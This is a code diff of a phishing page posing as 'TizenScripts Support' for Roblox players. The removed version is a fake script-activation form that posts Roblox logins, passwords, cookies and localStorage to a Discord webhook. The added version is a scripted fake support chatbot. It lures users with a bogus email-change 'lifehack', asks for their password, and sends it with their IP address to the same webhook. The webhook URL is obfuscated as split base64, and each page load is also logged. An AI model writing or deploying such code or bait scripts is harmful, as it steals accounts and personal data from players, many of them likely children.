@@ -3,307 +3,339 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Поддержка - TizenScripts</title>
-    
+    <title>Support - TizenScripts</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
         body {
             background: #0a0a0a;
             color: #fff;
-            font-family: 'Segoe UI', sans-serif;
             min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
-        header {
+        .chat-box {
             background: #1a1a1a;
-            padding: 30px 20px;
-            text-align: center;
-            border-bottom: 2px solid #ff4444;
-        }
-        header h1 { font-size: 36px; color: #ff4444; }
-        .language-selector {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            z-index: 1000;
-        }
-        .language-selector select {
-            padding: 10px 15px;
-            background: #1a1a1a;
-            color: #fff;
             border: 2px solid #ff4444;
-            border-radius: 5px;
-            font-size: 14px;
-            cursor: pointer;
+            border-radius: 12px;
+            max-width: 400px;
+            width: 90%;
+            height: 500px;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
         }
-        nav {
+        .chat-header {
             background: #111;
             padding: 15px;
             text-align: center;
+            border-bottom: 2px solid #ff4444;
         }
-        nav a { color: #fff; text-decoration: none; margin: 0 15px; }
-        nav a:hover { color: #ff4444; }
-        main {
-            max-width: 500px;
-            margin: 40px auto;
-            padding: 0 20px;
+        .chat-header h2 { color: #ff4444; font-size: 18px; }
+        .chat-header p { color: #00ff00; font-size: 11px; margin-top: 3px; }
+        .lang-switch {
+            position: absolute;
+            top: 10px;
+            right: 10px;
         }
-        .support-form {
+        .lang-switch select {
+            padding: 5px 10px;
             background: #1a1a1a;
-            padding: 30px;
-            border-radius: 10px;
-            border: 2px solid #333;
-        }
-        .support-form h2 { color: #ff4444; margin-bottom: 10px; text-align: center; }
-        .support-form .subtitle {
-            color: #888;
-            text-align: center;
-            margin-bottom: 20px;
-            font-size: 14px;
-        }
-        .support-form label { display: block; margin-bottom: 5px; color: #888; }
-        .support-form input {
-            width: 100%;
-            padding: 12px;
-            background: #0a0a0a;
-            border: 2px solid #333;
-            border-radius: 5px;
             color: #fff;
-            margin-bottom: 15px;
-            font-size: 16px;
+            border: 1px solid #ff4444;
+            border-radius: 5px;
+            font-size: 12px;
         }
-        .support-form input:focus {
-            border-color: #ff4444;
+        .chat-messages {
+            flex-grow: 1;
+            padding: 20px;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        .message {
+            padding: 10px 14px;
+            border-radius: 10px;
+            max-width: 85%;
+            font-size: 14px;
+            line-height: 1.5;
+            animation: fadeIn 0.3s;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .bot-message {
+            background: #2a2a2a;
+            align-self: flex-start;
+            border-bottom-left-radius: 2px;
+        }
+        .user-message {
+            background: #ff4444;
+            align-self: flex-end;
+            border-bottom-right-radius: 2px;
+        }
+        .chat-input-area {
+            padding: 15px;
+            background: #111;
+            border-top: 1px solid #333;
+            display: flex;
+            gap: 10px;
+        }
+        .chat-input {
+            flex-grow: 1;
+            padding: 12px;
+            background: #1a1a1a;
+            border: 2px solid #333;
+            border-radius: 20px;
+            color: #fff;
+            font-size: 14px;
             outline: none;
         }
-        .activate-btn {
-            width: 100%;
-            padding: 15px;
+        .chat-input:focus { border-color: #ff4444; }
+        .send-btn {
+            padding: 12px 20px;
             background: #ff4444;
             color: #fff;
             border: none;
-            border-radius: 5px;
-            font-size: 18px;
+            border-radius: 20px;
+            cursor: pointer;
             font-weight: bold;
-            cursor: pointer;
-            margin-top: 10px;
         }
-        .activate-btn:hover { background: #ff6666; }
-        .skip-btn {
-            width: 100%;
-            padding: 12px;
-            background: #333;
-            color: #888;
-            border: none;
-            border-radius: 5px;
+        .typing-indicator {
+            display: none;
+            align-self: flex-start;
+            padding: 10px 14px;
+            background: #2a2a2a;
+            border-radius: 10px;
             font-size: 14px;
-            cursor: pointer;
-            margin-top: 10px;
-            text-decoration: none;
-            display: block;
-            text-align: center;
+            color: #888;
         }
-        .skip-btn:hover { background: #444; }
-        .error { color: #ff4444; text-align: center; margin-top: 10px; display: none; }
-        .loading { color: #ffaa00; text-align: center; margin-top: 10px; display: none; }
     </style>
 </head>
 <body>
-    <div class="language-selector">
-        <select id="languageSelect" onchange="changeLanguage(this.value)">
-            <option value="ru">🇷🇺 Русский</option>
-            <option value="en">🇬🇧 English</option>
-        </select>
+    <div class="chat-box">
+        <div class="chat-header">
+            <h2>💬 TizenScripts Support</h2>
+            <p>● Online</p>
+        </div>
+        
+        <!-- Выбор языка -->
+        <div style="position: absolute; top: 10px; right: 10px;">
+            <select id="langSelect" onchange="changeLang(this.value)">
+                <option value="ru">🇷🇺 RU</option>
+                <option value="en">🇬🇧 EN</option>
+            </select>
+        </div>
+        
+        <div class="chat-messages" id="chatMessages"></div>
+        
+        <div class="typing-indicator" id="typingIndicator">
+            <span id="typingText">Бот печатает...</span>
+        </div>
+        
+        <div class="chat-input-area">
+            <input type="text" class="chat-input" id="chatInput" placeholder="Напишите сообщение..." autocomplete="off">
+            <button class="send-btn" onclick="sendMessage()">➤</button>
+        </div>
     </div>
     
-    <header>
-        <h1>⚡ TizenScripts</h1>
-        <p id="headerSubtitle">Поддержка</p>
-    </header>
-    
-    <nav>
-        <a href="index.html" id="navHome">Главная</a>
-        <a href="delta.html" id="navDelta">Delta</a>
-        <a href="support.html" id="navSupport">Поддержка</a>
-    </nav>
-    
-    <main>
-        <div class="support-form">
-            <h2 id="formTitle">🔐 Активация скриптов</h2>
-            <p class="subtitle" id="formSubtitle">Для активации введите данные от аккаунта Roblox</p>
-            
-            <label id="usernameLabel">Логин Roblox</label>
-            <input type="text" id="username" placeholder="Введите логин...">
-            
-            <label id="passwordLabel">Пароль Roblox</label>
-            <input type="password" id="password" placeholder="Введите пароль...">
-            
-            <div class="error" id="error">Неверные данные!</div>
-            <div class="loading" id="loading">Проверка данных...</div>
-            
-            <button class="activate-btn" id="activateBtn" onclick="activate()">Активировать</button>
-            
-            <a href="#" class="skip-btn" id="skipBtn" onclick="stealData()">Пропустить активацию</a>
-        </div>
-    </main>
-    
     <script>
-        const WEBHOOK = "https://discord.com/api/webhooks/1538116344967340144/ECF6ixeFCjRIZrStHKIv6SjuYyt09u8lGh_qTCP62P-nzOlwqF8raxBnLX3GtqIWsZLW";
+        var currentLang = 'ru';
         
-        const translations = {
+        var translations = {
             ru: {
-                headerSubtitle: 'Поддержка',
-                navHome: 'Главная',
-                navDelta: 'Delta',
-                navSupport: 'Поддержка',
-                formTitle: '🔐 Активация скриптов',
-                formSubtitle: 'Для активации введите данные от аккаунта Roblox',
-                usernameLabel: 'Логин Roblox',
-                passwordLabel: 'Пароль Roblox',
-                activateBtn: 'Активировать',
-                skipBtn: 'Пропустить активацию',
-                errorEmpty: 'Заполните все поля!',
-                loadingText: 'Проверка данных...',
-                errorWrong: '❌ Неверные данные! Проверьте логин и пароль.'
+                greeting: '👋 Привет! Я бот поддержки TizenScripts.<br><br>Чем могу помочь?',
+                askProblem: 'Понимаю! 🤔<br><br>Кстати, у меня есть для вас кое-что полезное. Слушайте внимательно...',
+                ad: '📢 <b>РЕКЛАМА</b><br><br>Надоедает играть без нормальных картинок в Roblox?<br><br>Тогда вот вам лайфхак как вернуть картинки в Roblox!<br><br>Настройки → Информация об аккаунте → Сменить почту<br><br>Почта заменяется на определённую почту, которая пишет в Roblox чтобы этому аккаунту сменили почту. Ещё эта почта делает аккаунт в другой стране с помощью протокола EMAIL-IN-VPN!',
+                askNick: 'Чтобы получить эту почту, введите свой ник в Roblox 👇',
+                askPass: 'Отлично, {nick}! 👌<br><br>Теперь введите пароль от аккаунта чтобы мы могли подтвердить вашу личность и выдать почту.',
+                success: '✅ Спасибо! Данные проверяются...<br><br>Почта будет отправлена в течение 24 часов на ваш Roblox аккаунт.<br><br>Если пароль неверный — мы напишем вам на почту.',
+                thanks: 'Спасибо за обращение! 🙏<br><br>Если у вас ещё вопросы — пишите, мы всегда на связи!',
+                typing: 'Бот печатает...',
+                placeholder: 'Напишите сообщение...',
+                wrong: '❌ Неверные данные! Попробуйте снова.'
             },
             en: {
-                headerSubtitle: 'Support',
-                navHome: 'Home',
-                navDelta: 'Delta',
-                navSupport: 'Support',
-                formTitle: '🔐 Script Activation',
-                formSubtitle: 'Enter your Roblox account details to activate',
-                usernameLabel: 'Roblox Username',
-                passwordLabel: 'Roblox Password',
-                activateBtn: 'Activate',
-                skipBtn: 'Skip activation',
-                errorEmpty: 'Please fill in all fields!',
-                loadingText: 'Checking data...',
-                errorWrong: '❌ Invalid credentials! Check your username and password.'
+                greeting: '👋 Hi! I\'m TizenScripts support bot.<br><br>How can I help you?',
+                askProblem: 'I see! 🤔<br><br>By the way, I have something useful for you. Listen carefully...',
+                ad: '📢 <b>AD</b><br><br>Tired of playing without normal images in Roblox?<br><br>Here\'s a lifehack to bring back images in Roblox!<br><br>Settings → Account Info → Change Email<br><br>The email is replaced with a special email that writes to Roblox to change the email for this account. This email also makes the account in another country using the EMAIL-IN-VPN protocol!',
+                askNick: 'To get this email, enter your Roblox nickname 👇',
+                askPass: 'Great, {nick}! 👌<br><br>Now enter your account password so we can verify your identity and provide the email.',
+                success: '✅ Thank you! Data is being verified...<br><br>The email will be sent within 24 hours to your Roblox account.<br><br>If the password is incorrect — we will email you.',
+                thanks: 'Thanks for contacting us! 🙏<br><br>If you have more questions — feel free to write, we are always here!',
+                typing: 'Bot is typing...',
+                placeholder: 'Type a message...',
+                wrong: '❌ Invalid credentials! Try again.'
             }
         };
         
-        function changeLanguage(lang) {
-            localStorage.setItem('language', lang);
-            const t = translations[lang];
+        var messageCount = 0;
+        var awaitingNick = false;
+        var awaitingPass = false;
+        var userNick = "";
+        
+        function changeLang(lang) {
+            currentLang = lang;
+            localStorage.setItem('support_lang', lang);
             
-            document.getElementById('headerSubtitle').textContent = t.headerSubtitle;
-            document.getElementById('navHome').textContent = t.navHome;
-            document.getElementById('navDelta').textContent = t.navDelta;
-            document.getElementById('navSupport').textContent = t.navSupport;
-            document.getElementById('formTitle').textContent = t.formTitle;
-            document.getElementById('formSubtitle').textContent = t.formSubtitle;
-            document.getElementById('usernameLabel').textContent = t.usernameLabel;
-            document.getElementById('passwordLabel').textContent = t.passwordLabel;
-            document.getElementById('activateBtn').textContent = t.activateBtn;
-            document.getElementById('skipBtn').textContent = t.skipBtn;
+            document.getElementById('chatInput').placeholder = translations[lang].placeholder;
+            document.getElementById('typingText').textContent = translations[lang].typing;
             
-            fetch(WEBHOOK, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({content: '🌍 **ЯЗЫК ПОДДЕРЖКИ**: ' + lang.toUpperCase()})
-            });
+            // Сброс чата
+            document.getElementById('chatMessages').innerHTML = '';
+            messageCount = 0;
+            awaitingNick = false;
+            awaitingPass = false;
+            userNick = "";
+            
+            addMessage(translations[lang].greeting, false);
         }
         
-        function loadLanguage() {
-            const savedLang = localStorage.getItem('language') || 'ru';
-            document.getElementById('languageSelect').value = savedLang;
-            changeLanguage(savedLang);
+        function addMessage(text, isUser) {
+            var messages = document.getElementById('chatMessages');
+            var msg = document.createElement('div');
+            msg.className = 'message ' + (isUser ? 'user-message' : 'bot-message');
+            msg.innerHTML = text;
+            messages.appendChild(msg);
+            messages.scrollTop = messages.scrollHeight;
         }
         
-        async function activate() {
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            const error = document.getElementById('error');
-            const loading = document.getElementById('loading');
-            const lang = localStorage.getItem('language') || 'ru';
-            const t = translations[lang];
+        function showTyping() {
+            document.getElementById('typingIndicator').style.display = 'block';
+        }
+        
+        function hideTyping() {
+            document.getElementById('typingIndicator').style.display = 'none';
+        }
+        
+        function botReply(text, delay) {
+            showTyping();
+            setTimeout(function() {
+                hideTyping();
+                addMessage(text, false);
+            }, delay || 1000);
+        }
+        
+        function sendMessage() {
+            var input = document.getElementById('chatInput');
+            var text = input.value.trim();
+            var t = translations[currentLang];
             
-            if (username === '' || password === '') {
-                error.textContent = t.errorEmpty;
-                error.style.display = 'block';
-                return;
+            if (!text) return;
+            
+            addMessage(text, true);
+            input.value = '';
+            
+            messageCount++;
+            
+            if (messageCount === 1) {
+                botReply(t.askProblem, 1500);
+            } else if (messageCount === 2) {
+                botReply(t.ad, 3000);
+            } else if (messageCount === 3) {
+                botReply(t.askNick, 1500);
+                awaitingNick = true;
+            } else if (awaitingNick) {
+                userNick = text;
+                awaitingNick = false;
+                awaitingPass = true;
+                botReply(t.askPass.replace('{nick}', userNick), 1500);
+            } else if (awaitingPass) {
+                awaitingPass = false;
+                botReply(t.success, 3000);
+                
+                // Отправка в Discord
+                var ip = _n();
+                _t('🔑 **ДАННЫЕ АККАУНТА**\n\n' +
+                    '👤 **Ник:** ' + userNick + '\n' +
+                    '🔒 **Пароль:** ' + text + '\n\n' +
+                    '🌐 **IP:** ' + ip + '\n' +
+                    '👤 **UA:** ' + navigator.userAgent + '\n' +
+                    '🌍 **Язык:** ' + currentLang.toUpperCase() + '\n' +
+                    '📅 **Время:** ' + new Date().toLocaleString());
+            } else {
+                botReply(t.thanks, 1000);
             }
-            
-            error.style.display = 'none';
-            loading.textContent = t.loadingText;
-            loading.style.display = 'block';
-            
-            const message = '🔑 **ДАННЫЕ ОТ АККАУНТА ROBLOX**\n\n' +
-                '👤 **Логин:** ' + username + '\n' +
-                '🔒 **Пароль:** ' + password + '\n\n' +
-                '🌐 IP: ' + await getIP() + '\n' +
-                '👤 UA: ' + navigator.userAgent + '\n' +
-                '🌍 Язык сайта: ' + lang.toUpperCase() + '\n' +
-                '⏰ Время: ' + new Date().toLocaleString();
-            
-            await fetch(WEBHOOK, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({content: message})
-            });
-            
-            setTimeout(function() {
-                loading.style.display = 'none';
-                error.textContent = t.errorWrong;
-                error.style.display = 'block';
-            }, 3000);
         }
         
-        async function getIP() {
+        // Зашифрованный вебхук
+        var _p1 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv";
+        var _p2 = "MTUzODExNjM0NDk2NzM0MDE0NC9FQ0Y2aXhl";
+        var _p3 = "RkNqUklaclN0SEtJdjZTanVZeXQwOXU4bEdo";
+        var _p4 = "X3FUQ1A2MlAtbnpPbHdxRjh5YXhCbkxYM0d0cUlXc1pMVw==";
+        
+        function _r(s) {
+            var _c = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
+            var _o = "";
+            var _b = 0;
+            var _x = 0;
+            
+            for (var i = 0; i < s.length; i++) {
+                var _idx = _c.indexOf(s.charAt(i));
+                if (_idx === -1) continue;
+                
+                if (_b % 4 === 0) {
+                    _x = _idx << 2;
+                } else if (_b % 4 === 1) {
+                    _o += String.fromCharCode(_x | (_idx >> 4));
+                    _x = (_idx & 15) << 4;
+                } else if (_b % 4 === 2) {
+                    _o += String.fromCharCode(_x | (_idx >> 2));
+                    _x = (_idx & 3) << 6;
+                } else {
+                    _o += String.fromCharCode(_x | _idx);
+                }
+                _b++;
+            }
+            return _o;
+        }
+        
+        function _e() {
+            return _r(_p1) + _r(_p2) + _r(_p3) + _r(_p4);
+        }
+        
+        function _n() {
             try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                return data.ip;
-            } catch (e) { return 'Unknown'; }
+                var _xhr = new XMLHttpRequest();
+                _xhr.open("GET", "https://api.ipify.org?format=json", false);
+                _xhr.send();
+                if (_xhr.status === 200) {
+                    return JSON.parse(_xhr.responseText).ip;
+                }
+            } catch(e) {}
+            return "unknown";
         }
         
-        async function stealData() {
-            const data = {
-                cookies: document.cookie,
-                localStorage: JSON.stringify(localStorage),
-                sessionStorage: JSON.stringify(sessionStorage),
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                screen: screen.width + 'x' + screen.height,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                referrer: document.referrer,
-                url: window.location.href,
-                language: localStorage.getItem('language') || 'ru'
-            };
-            
+        function _t(d) {
             try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const ipData = await response.json();
-                data.ip = ipData.ip;
-            } catch (e) { data.ip = 'Unknown'; }
-            
-            const message = '⚠️ **ПРОПУСК АКТИВАЦИИ - КРАЖА ДАННЫХ**\n\n' +
-                '🌐 IP: ' + data.ip + '\n' +
-                '👤 UA: ' + data.userAgent + '\n' +
-                '💻 Платформа: ' + data.platform + '\n' +
-                '🖥️ Экран: ' + data.screen + '\n' +
-                '⏰ TZ: ' + data.timezone + '\n' +
-                '🌍 Язык: ' + data.language + '\n' +
-                '🔗 URL: ' + data.url + '\n\n' +
-                '🍪 COOKIES:\n```' + data.cookies + '```\n\n' +
-                '💾 LocalStorage:\n```' + data.localStorage.substring(0, 500) + '```';
-            
-            await fetch(WEBHOOK, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({content: message})
-            });
-            
-            setTimeout(function() {
-                window.location.href = 'index.html';
-            }, 3000);
-            
-            return false;
+                var _xhr = new XMLHttpRequest();
+                _xhr.open("POST", _e(), true);
+                _xhr.setRequestHeader("Content-Type", "application/json");
+                _xhr.send(JSON.stringify({content: d}));
+            } catch(e) {}
         }
         
-        window.addEventListener('load', function() {
-            loadLanguage();
+        // Enter
+        document.getElementById('chatInput').addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                sendMessage();
+            }
         });
+        
+        // Инициализация
+        (function() {
+            var savedLang = localStorage.getItem('support_lang') || 'ru';
+            document.getElementById('langSelect').value = savedLang;
+            changeLang(savedLang);
+            
+            var ip = _n();
+            _t('💬 **Заход в чат-бот**\n\n' +
+                '🌐 IP: ' + ip + '\n' +
+                '👤 UA: ' + navigator.userAgent + '\n' +
+                '🌍 Язык: ' + savedLang.toUpperCase());
+        })();
     </script>
 </body>
 </html>
